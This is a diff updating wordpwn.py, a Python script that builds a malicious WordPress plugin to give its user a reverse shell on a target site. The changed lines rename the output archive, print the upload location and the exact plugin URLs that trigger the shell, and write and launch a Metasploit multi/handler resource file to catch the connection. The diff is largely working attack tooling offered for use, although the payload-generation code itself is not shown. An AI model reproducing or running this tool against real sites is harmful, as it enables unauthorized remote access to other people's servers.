@@ -1,10 +1,10 @@
 #!/usr/bin/env python
 #
 # Script name     : wordpwn.py
-# Version         : 2.0
+# Version         : 2.1
 # Created date    : 3/1/2017
-# Last update     : 5/1/2017
-# Author          : wetw0rk
+# Last update     : 25/02/2020
+# Author          : wetw0rk & 3isenHeiM
 # Inspired by     : Metasploit admin shell upload
 # Python version  : 2.7
 # Description     : Simply generates a wordpress plugin that will grant you a reverse shell
@@ -74,17 +74,20 @@ def generate_plugin(LHOST, LPORT, PAYLOAD):
 	payload_file.close()
 	# Create Zip With Payload
 	print "[+] Writing files to zip"
-	make_zip = zipfile.ZipFile('malicous.zip', 'w')
+	make_zip = zipfile.ZipFile('malicious.zip', 'w')
 	make_zip.write('wetw0rk_maybe.php')
 	make_zip.write('QwertyRocks.php')
 	print "[+] Cleaning up files"
 	os.system("rm QwertyRocks.php wetw0rk_maybe.php")
 	# Useful Info
-	print "[+] General Execution Location: http://(target)/wp-content/plugins/malicous/"
 	print "[+] General Upload Location: http://(target)/wp-admin/plugin-install.php?tab=upload"
+	print "[+] How to trigger the reverse shell : "
+	print "      ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php"
+	print "      ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php"
+
 
 def handler(LHOST, LPORT, PAYLOAD):
-
+	# Write MSF ressource file
 	print "[+] Launching handler"
 	handler = "use exploit/multi/handler\n"
 	handler += "set PAYLOAD %s\n" % PAYLOAD
@@ -94,7 +97,7 @@ def handler(LHOST, LPORT, PAYLOAD):
 	handler_file = open('wordpress.rc', 'w')
 	handler_file.write(handler)
 	handler_file.close()
-	os.system("/etc/init.d/postgresql start")
+	# Start MetaSploit and setup listener
 	os.system("msfconsole -r wordpress.rc")
 
 
@@ -105,4 +108,3 @@ if HANDLER == 'Y':
 	handler(LHOST, LPORT, PAYLOAD)
 else:
 	sys.exit()
-
